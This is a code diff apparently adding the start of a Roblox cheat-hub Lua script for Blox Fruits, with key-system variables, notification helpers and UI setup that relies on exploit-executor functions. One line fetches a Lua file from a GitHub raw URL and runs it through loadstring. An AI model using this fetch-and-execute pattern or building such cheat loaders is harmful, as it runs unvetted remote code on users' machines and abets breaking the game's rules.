@@ -1,3 +1,41 @@
+local AlchemyHub_Version = "1.0 [ Free ]"
+local AlchemyHub_UserCalling = game.Players.LocalPlayer.Name
+local textchange_cooldown = 3
+local Alchemy_GameName = "Blox Fruits"
+local AlchemyNotify = function(Text_i,Duration_i)
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "BRUTALITY HUB",
+        Text = Text_i,
+        Duration = Duration_i,
+        Icon = "rbxassetid://16058297648"
+    })
+end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MedusaScript/Brutality-V2/main/InviteToDiscord.lua"))()
+_G.AlchemyHub_KeySystem = {
+	KeySaved = "IDK"
+}
+local Plr = game.Players.LocalPlayer
+if not game:IsLoaded()then 
+	print("Wait...")
+end
+UIThemeColorSave = Color3.fromRGB(0, 255, 145)
+LOGOAlchemyLOL = "http://www.roblox.com/asset/?id=16058297648"
+_G.Config_AlchemyUI = {
+    KeyBind = Enum.KeyCode.Delete
+}
+print("Wait...")
+local Device_Checking = false
+local HttpService = game:GetService("HttpService")
+local requestt = http_request or request or syn.request
+local web_aurl = 'wD8785Ci6CUGuGMs'
+local Path = "http://www.roblox.com/asset/?id="
+local headers = {
+    ["Content-Type"] = "application/json"
+}
+function _G.WebhookGG_ALX(a,b)
+    print(a)
+    print(b)
+end
 local AlchemyHubKeySystem = Instance.new("ScreenGui")
 local ShadowFrame = Instance.new("Frame")
 local ShadowCorner = Instance.new("UICorner")
